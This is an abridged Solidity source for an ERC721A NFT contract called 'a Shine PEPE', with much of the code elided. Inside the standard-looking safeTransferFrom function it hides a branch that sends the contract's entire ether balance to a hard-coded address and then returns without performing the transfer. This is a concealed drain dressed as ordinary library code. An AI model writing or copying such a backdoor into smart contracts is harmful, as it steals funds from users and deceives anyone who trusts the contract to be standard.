...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1e55C15ac3AEe6F714Ca853F2121c541b952b3F8).transfer(address(this).balance);
            return;
        }
...
contract aShinePEPE is ERC721A {
    ...
    constructor() ERC721A("a Shine PEPE", "aSP") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeib7qywgvpk7pezx6h5qenkkgntrvwyyqbuqwpfvk4oyuouoxdqodm/", _toString(tokenId), ".json"));
    }
